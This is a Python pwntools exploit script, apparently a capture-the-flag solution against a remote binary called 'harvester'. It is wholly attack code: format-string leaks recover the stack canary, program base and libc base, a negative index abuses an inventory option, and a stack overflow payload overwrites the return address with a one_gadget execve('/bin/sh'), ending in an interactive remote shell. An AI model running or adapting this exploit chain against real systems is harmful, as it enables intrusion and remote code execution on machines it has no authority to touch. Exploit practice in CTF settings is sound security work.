#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('harvester')
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = "debug"
libc = ELF('./libc.so.6')
env = {
    "LD_PRELOAD": os.path.abspath('./libc.so.6')
}
# p = process(['./ld-2.27_64.so', elf.path], env=env)
# gdb.attach(p, 'init-gef\nfile harvester')
p = remote("138.68.178.56", 32471)
# p = process(elf.path)
# gdb.attach(p, 'pie break *0xBBE')

def option(num):
    p.sendlineafter("> ", str(num))

def fight(weapon):
    option(1)
    p.sendafter("> ", weapon)
    p.recvuntil("choice is: ")
    return p.recvuntil("\x1b[1;31m", True)


canary = int(fight('%11$p'), 16)
log.info("Canary: 0x{:x}".format(canary))

elf.address = int(fight('%13$p'), 16) - 0xeca
log.info("ELF: 0x{:x}".format(elf.address))

libc.address = int(fight('%21$p'), 16) - 0x21bf7
log.info("Libc : 0x{:x}".format(libc.address))

# inventory
option(2)
p.sendlineafter("(y/n)\n> ", 'y')
p.sendlineafter("drop?\n> ", '-11') # i have 10 already

target_rbp = libc.address + 0x3eb220
"""
# one_gadget libc.so.6 -l 2
0xe5617 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
"""

one_gadget = libc.address + 0xe5617

# stare
option(3)
payload = "A" * 40
payload += p64(canary)
payload += p64(target_rbp)
payload += p64(one_gadget)
p.sendafter("> ", payload)

p.interactive()

